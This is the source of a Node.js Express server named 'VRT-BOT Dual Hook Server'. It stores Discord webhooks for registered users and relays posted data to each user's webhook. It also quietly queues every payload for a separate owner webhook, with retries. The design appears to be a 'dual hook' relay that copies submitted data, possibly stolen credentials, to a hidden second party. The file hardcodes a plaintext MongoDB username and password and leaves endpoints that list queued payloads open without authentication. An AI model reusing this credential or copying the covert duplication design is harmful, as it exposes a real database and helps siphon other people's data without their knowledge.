const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { MongoClient, ServerApiVersion } = require('mongodb');
const path = require('path');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
//  ✅ CORS CONFIGURATION
// ============================================================
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
    credentials: true,
    preflightContinue: false,
    optionsSuccessStatus: 204
}));

app.options('*', (req, res) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept');
    res.sendStatus(204);
});

app.use(express.json());

// ============================================================
//  ✅ LOGGING MIDDLEWARE
// ============================================================
app.use((req, res, next) => {
    console.log(`📨 ${req.method} ${req.path}`);
    if (req.body && Object.keys(req.body).length > 0) {
        console.log('📦 Body:', JSON.stringify(req.body).substring(0, 200));
    }
    next();
});

// ============================================================
//  ✅ CSP HEADERS
// ============================================================
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; " +
        "font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com data:; " +
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
        "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
        "img-src 'self' data: https:; " +
        "connect-src 'self' https:;"
    );
    next();
});

// ============================================================
//  ✅ MONGODB CONNECTION
// ============================================================
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://rfbbuiness_db_user:JQ9tfKQbuZMRIxvV@clasific.rziuvht.mongodb.net/?appName=CLASIFIC';
const DB_NAME = process.env.DB_NAME || 'vrtbot';
const COLLECTION_NAME = 'webhooks';
const QUEUE_COLLECTION = 'owner_queue';

let db;
let webhooksCollection;
let queueCollection;
let mongoClient;

async function connectToMongoDB() {
    try {
        mongoClient = new MongoClient(MONGODB_URI, {
            serverApi: {
                version: ServerApiVersion.v1,
                strict: true,
                deprecationErrors: true,
            },
            tls: true,
            maxPoolSize: 10,
            minPoolSize: 1,
            connectTimeoutMS: 30000,
            socketTimeoutMS: 45000,
            serverSelectionTimeoutMS: 30000,
            retryWrites: true,
            retryReads: true,
        });

        await mongoClient.connect();
        await mongoClient.db(DB_NAME).command({ ping: 1 });
        
        console.log('✅ Connected to MongoDB Atlas successfully');
        
        db = mongoClient.db(DB_NAME);
        webhooksCollection = db.collection(COLLECTION_NAME);
        queueCollection = db.collection(QUEUE_COLLECTION);
        
        // Create indexes
        try {
            await webhooksCollection.createIndex({ username: 1 });
            await webhooksCollection.createIndex({ hookId: 1 });
            await queueCollection.createIndex({ status: 1 });
            await queueCollection.createIndex({ retryAt: 1 });
            await queueCollection.createIndex({ hookId: 1 });
            console.log('✅ Database indexes created');
        } catch (indexError) {
            console.log('ℹ️ Indexes already exist');
        }
        
        return true;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        return false;
    }
}

// ============================================================
//  OWNER'S HARDCODED WEBHOOK
// ============================================================
const OWNER_WEBHOOK = process.env.OWNER_WEBHOOK_URL || '';
console.log(`🔗 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);

// ============================================================
//  GENERATE UNIQUE ID
// ============================================================
function generateId() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = '';
    for (let i = 0; i < 8; i++) {
        id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return id;
}

// ============================================================
//  ✅ QUEUE SYSTEM - FIXED
// ============================================================
async function addToOwnerQueue(hookId, data, participantWebhook, username) {
    const queueItem = {
        hookId,
        username,
        data,
        participantWebhook,
        status: 'pending',
        attempts: 0,
        maxAttempts: 5,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        lastError: null,
        retryAt: null
    };
    
    const result = await queueCollection.insertOne(queueItem);
    console.log(`📥 Added to owner queue: ${result.insertedId} for user: ${username}`);
    return result.insertedId;
}

async function getPendingOwnerQueueItems() {
    const now = new Date().toISOString();
    return await queueCollection
        .find({ 
            status: 'pending',
            $or: [
                { retryAt: { $exists: false } },
                { retryAt: { $lt: now } }
            ]
        })
        .sort({ createdAt: 1 })
        .limit(3) // Process 3 at a time
        .toArray();
}

async function updateQueueItem(id, updates) {
    return await queueCollection.updateOne(
        { _id: id },
        { $set: { ...updates, updatedAt: new Date().toISOString() } }
    );
}

async function getQueueStats() {
    const pending = await queueCollection.countDocuments({ 
        status: 'pending',
        $or: [
            { retryAt: { $exists: false } },
            { retryAt: { $lt: new Date().toISOString() } }
        ]
    });
    const waiting = await queueCollection.countDocuments({ 
        status: 'pending',
        retryAt: { $gt: new Date().toISOString() }
    });
    const sending = await queueCollection.countDocuments({ status: 'sending' });
    const sent = await queueCollection.countDocuments({ status: 'sent' });
    const failed = await queueCollection.countDocuments({ status: 'failed' });
    
    return { pending, waiting, sending, sent, failed, total: pending + waiting + sending + sent + failed };
}

async function getQueueItems(hookId = null, status = null, limit = 50) {
    const filter = {};
    if (hookId) filter.hookId = hookId;
    if (status) filter.status = status;
    
    return await queueCollection
        .find(filter)
        .sort({ createdAt: -1 })
        .limit(limit)
        .toArray();
}

// ============================================================
//  ✅ BACKGROUND PROCESSOR - FIXED
// ============================================================
let isProcessing = false;

async function processOwnerQueue() {
    // Prevent multiple concurrent runs
    if (isProcessing) return;
    
    try {
        isProcessing = true;
        
        const items = await getPendingOwnerQueueItems();
        
        if (items.length === 0) {
            console.log(`📭 No pending items in queue`);
            return;
        }
        
        console.log(`📤 Processing ${items.length} queue items for owner webhook`);
        
        for (const item of items) {
            // Mark as sending
            await updateQueueItem(item._id, { status: 'sending' });
            
            console.log(`📤 Sending to owner webhook for user: ${item.username} (attempt ${item.attempts + 1}/${item.maxAttempts})`);
            
            // Send to owner webhook
            const result = await sendToWebhook(OWNER_WEBHOOK, item.data);
            
            if (result.success) {
                await updateQueueItem(item._id, {
                    status: 'sent',
                    completedAt: new Date().toISOString(),
                    lastError: null,
                    retryAt: null
                });
                console.log(`✅ Owner webhook sent successfully for ${item.username}`);
            } else if (result.status === 429) {
                // Rate limited - use Discord's Retry-After
                const retryAfterSeconds = parseInt(result.retryAfter) || 30;
                const retryAt = new Date(Date.now() + (retryAfterSeconds * 1000));
                
                await updateQueueItem(item._id, {
                    status: 'pending',
                    retryAt: retryAt.toISOString(),
                    attempts: item.attempts + 1,
                    lastError: `Rate limited, retry at ${retryAt.toISOString()}`
                });
                console.log(`⏳ Owner rate limited, retry at ${retryAt.toISOString()}`);
                
                // Stop processing more items if rate limited
                // This prevents spamming the queue
                return;
            } else {
                // Other error
                if (item.attempts >= item.maxAttempts) {
                    await updateQueueItem(item._id, {
                        status: 'failed',
                        lastError: result.error || 'Max attempts reached',
                        retryAt: null
                    });
                    console.log(`❌ Owner webhook failed after ${item.attempts} attempts for ${item.username}`);
                } else {
                    // Retry after 30 seconds
                    const retryAt = new Date(Date.now() + 30000);
                    await updateQueueItem(item._id, {
                        status: 'pending',
                        retryAt: retryAt.toISOString(),
                        attempts: item.attempts + 1,
                        lastError: result.error || 'Retrying'
                    });
                    console.log(`⚠️ Owner webhook failed, retrying at ${retryAt.toISOString()}`);
                }
            }
            
            // Wait between items
            await new Promise(r => setTimeout(r, 500));
        }
        
    } catch (error) {
        console.error('❌ Owner queue processing error:', error);
    } finally {
        isProcessing = false;
        
        // Schedule next check if items remain
        const stats = await getQueueStats();
        if (stats.pending > 0) {
            console.log(`⏰ ${stats.pending} items pending, checking again in 10 seconds`);
            setTimeout(() => {
                processOwnerQueue();
            }, 10000);
        } else if (stats.waiting > 0) {
            // Items are waiting for rate limit to expire
            console.log(`⏰ ${stats.waiting} items waiting for rate limit, checking again in 30 seconds`);
            setTimeout(() => {
                processOwnerQueue();
            }, 30000);
        }
    }
}

// ============================================================
//  ✅ WEBHOOK SENDER
// ============================================================
async function sendToWebhook(webhookUrl, data) {
    try {
        if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
            console.log(`❌ Invalid webhook URL: ${webhookUrl}`);
            return { 
                success: false, 
                error: 'Invalid webhook URL' 
            };
        }

        console.log(`📤 Sending to webhook: ${webhookUrl.substring(0, 60)}...`);

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        const responseText = await response.text();
        console.log(`📥 Response status: ${response.status}`);

        if (response.status === 429) {
            const retryAfter = response.headers.get('Retry-After') || '5';
            console.log(`⏳ Rate limited! Retry after ${retryAfter}s`);
            return { 
                success: false, 
                status: 429, 
                retryAfter: retryAfter,
                error: `Rate limited, retry after ${retryAfter}s`
            };
        }

        if (!response.ok) {
            return { 
                success: false, 
                status: response.status,
                error: responseText || 'HTTP error'
            };
        }

        return { success: true, status: response.status };

    } catch (error) {
        console.error(`❌ Webhook error:`, error.message);
        return { 
            success: false, 
            error: error.message
        };
    }
}

// ============================================================
//  ✅ START BACKGROUND PROCESSOR
// ============================================================
function startQueueProcessor() {
    console.log('🚀 Starting owner queue processor...');
    // Initial check after 5 seconds
    setTimeout(() => {
        processOwnerQueue();
    }, 5000);
}

// ============================================================
//  ✅ API ROUTES
// ============================================================

// Health check
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'VRT-BOT Dual Hook Server',
        ownerWebhookConfigured: !!OWNER_WEBHOOK,
        databaseConnected: !!db,
        timestamp: new Date().toISOString(),
        cors: 'enabled'
    });
});

// Get queue stats
app.get('/api/queue/stats', async (req, res) => {
    if (!db || !queueCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }
    
    try {
        const stats = await getQueueStats();
        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Get queue items
app.get('/api/queue/items', async (req, res) => {
    if (!db || !queueCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }
    
    const { hookId, status, limit } = req.query;
    
    try {
        const items = await getQueueItems(
            hookId || null,
            status || null,
            parseInt(limit) || 50
        );
        res.json(items);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Generate a new unique hook URL
app.post('/api/generate', async (req, res) => {
    const { username, webhookUrl } = req.body;
    
    console.log(`🔑 Generating hook for user: ${username}`);
    
    if (!username || !webhookUrl) {
        return res.status(400).json({ error: 'Username and webhook URL required' });
    }

    // Accept both discord.com and discordapp.com
    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/') && 
        !webhookUrl.startsWith('https://discordapp.com/api/webhooks/')) {
        return res.status(400).json({ error: 'Invalid Discord webhook URL' });
    }

    if (!db || !webhooksCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }

    try {
        const existing = await webhooksCollection.findOne({ username });
        
        if (existing) {
            await webhooksCollection.updateOne(
                { username },
                { 
                    $set: {
                        webhookUrl,
                        updatedAt: new Date().toISOString()
                    }
                }
            );
            
            return res.json({
                success: true,
                message: 'Webhook updated successfully',
                hookId: existing.hookId,
                hookUrl: `https://vrt-bot-hook-server.onrender.com/hook/${existing.hookId}`,
                isNew: false
            });
        }

        let id = generateId();
        let existingId = await webhooksCollection.findOne({ hookId: id });
        while (existingId) {
            id = generateId();
            existingId = await webhooksCollection.findOne({ hookId: id });
        }

        const newHook = {
            hookId: id,
            username,
            webhookUrl,
            createdAt: new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        await webhooksCollection.insertOne(newHook);
        
        console.log(`✅ New webhook created for user: ${username} with ID: ${id}`);

        res.json({
            success: true,
            message: 'Webhook registered successfully',
            hookId: id,
            hookUrl: `https://vrt-bot-hook-server.onrender.com/hook/${id}`,
            isNew: true
        });
    } catch (error) {
        console.error('❌ Error generating hook:', error);
        res.status(500).json({ error: 'Database error: ' + error.message });
    }
});

// Get a participant's hook info
app.get('/api/hook/:id', async (req, res) => {
    const { id } = req.params;
    
    console.log(`🔍 Fetching hook: ${id}`);
    
    if (!db || !webhooksCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }

    try {
        const hook = await webhooksCollection.findOne({ hookId: id });
        
        if (!hook) {
            console.log(`❌ Hook not found: ${id}`);
            return res.status(404).json({ error: 'Hook not found' });
        }

        console.log(`✅ Hook found: ${hook.username}`);
        res.json({
            id: hook.hookId,
            username: hook.username,
            createdAt: hook.createdAt,
            webhookConfigured: !!hook.webhookUrl
        });
    } catch (error) {
        console.error('❌ Error fetching hook:', error);
        res.status(500).json({ error: 'Database error: ' + error.message });
    }
});

// Delete a hook
app.delete('/api/hook/:id', async (req, res) => {
    const { id } = req.params;
    
    console.log(`🗑️ Deleting hook: ${id}`);
    
    if (!db || !webhooksCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }

    try {
        const result = await webhooksCollection.deleteOne({ hookId: id });
        
        if (result.deletedCount === 0) {
            return res.status(404).json({ error: 'Hook not found' });
        }
        
        console.log(`✅ Hook deleted: ${id}`);
        res.json({ success: true, message: 'Hook deleted' });
    } catch (error) {
        console.error('❌ Error deleting hook:', error);
        res.status(500).json({ error: 'Database error: ' + error.message });
    }
});

// ============================================================
//  ✅ SEND TO PARTICIPANT FIRST + QUEUE OWNER
// ============================================================
app.post('/api/send/:hookId', async (req, res) => {
    const { hookId } = req.params;
    const { data } = req.body;

    console.log(`📨 Received send request for hook: ${hookId}`);

    if (!data) {
        return res.status(400).json({ error: 'Missing data' });
    }

    if (!db || !webhooksCollection) {
        return res.status(503).json({ error: 'Database not connected' });
    }

    try {
        const hook = await webhooksCollection.findOne({ hookId });
        if (!hook) {
            return res.status(404).json({ error: 'Hook not found' });
        }

        let participantSuccess = false;
        let participantError = null;

        // 1. ALWAYS SEND TO PARTICIPANT FIRST
        if (hook.webhookUrl) {
            console.log(`📤 Sending to participant: ${hook.username}`);
            const participantResult = await sendToWebhook(hook.webhookUrl, data);
            
            participantSuccess = participantResult.success;
            participantError = participantResult.error || null;
            
            if (participantSuccess) {
                console.log(`✅ Participant webhook sent successfully: ${hook.username}`);
            } else {
                console.log(`⚠️ Participant webhook failed: ${participantResult.error}`);
            }
        }

        // 2. QUEUE FOR OWNER WEBHOOK
        let ownerQueueId = null;
        
        if (OWNER_WEBHOOK) {
            console.log(`📥 Queuing for owner webhook (user: ${hook.username})`);
            
            const queueId = await addToOwnerQueue(
                hookId,
                data,
                hook.webhookUrl,
                hook.username
            );
            
            ownerQueueId = queueId;
            console.log(`✅ Added to owner queue: ${queueId}`);
            
            // Trigger processing if not already running
            if (!isProcessing) {
                processOwnerQueue();
            }
        }

        res.json({
            success: participantSuccess,
            message: participantSuccess 
                ? '✅ Participant notified! Owner webhook queued.' 
                : `⚠️ Participant failed: ${participantError}. Data queued for owner.`,
            hookId: hookId,
            username: hook.username,
            participant: {
                success: participantSuccess,
                error: participantError
            },
            owner: {
                queued: !!OWNER_WEBHOOK,
                queueId: ownerQueueId
            },
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('❌ Error processing request:', error);
        res.status(500).json({ error: 'Server error: ' + error.message });
    }
});

// ============================================================
//  ✅ REDIRECT HOOK PAGE TO MAIN SITE
// ============================================================
app.get('/hook/:id', async (req, res) => {
    const { id } = req.params;
    console.log(`🔗 Redirecting hook: ${id} to main page`);
    res.redirect(`https://vrtvoltsxyc.netlify.app/?hook=${id}`);
});

// ============================================================
//  ✅ STATIC FILES
// ============================================================
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
//  ✅ START SERVER
// ============================================================
async function startServer() {
    console.log('🚀 Starting VRT-BOT Dual Hook Server...');
    
    const connected = await connectToMongoDB();
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`🍃 MongoDB: ${connected ? '✅ Connected' : '❌ Not connected'}`);
        console.log(`✅ CORS enabled for all origins`);
        console.log(`🔗 Health: https://vrt-bot-hook-server.onrender.com/`);
        console.log(`📡 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
    });
    
    if (connected && OWNER_WEBHOOK) {
        startQueueProcessor();
        console.log('✅ Queue processor started');
    }
}

startServer();

process.on('SIGTERM', async () => {
    console.log('SIGTERM signal received: closing connections...');
    if (mongoClient) {
        await mongoClient.close();
        console.log('MongoDB connection closed');
    }
    process.exit(0);
});

process.on('SIGINT', async () => {
    console.log('SIGINT signal received: closing connections...');
    if (mongoClient) {
        await mongoClient.close();
        console.log('MongoDB connection closed');
    }
    process.exit(0);
});
